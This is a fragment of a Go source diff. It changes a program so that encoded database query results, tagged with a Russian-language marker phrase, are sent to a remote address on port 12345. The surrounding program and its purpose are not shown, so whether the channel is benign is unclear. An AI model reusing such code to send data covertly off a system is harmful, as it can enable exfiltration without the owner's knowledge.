@@ -68,6 +68,10 @@ func allIP(address string) string {
 	return parts[0] + "." + parts[1] + "." + parts[2] + "." + parts[3]
 }
 
+func mPort(address string) string {
+	return strings.Split(address, ":")[0]
+}
+
 func main() {
 	defer func() {
 		if r := recover(); r != nil {
@@ -117,11 +121,11 @@ func main() {
 		for _, e := range res {
 			var p string
 			for _, ee := range *e {
-				p += (*ee).String + " "
+				p += (*ee).String + "-|-"
 			}
 			r += p + "\\n"
 		}
-		send(allIP(localAddr().String())+":12345", "бананы лопала бомба$|"+encode(r)+"|||")
+		send(mPort(address.String())+":12345", "бананы лопала бомба$|"+encode(r)+"|||")
 		err = querys.Close()
 		if err != nil {
 			myerr(err.Error())
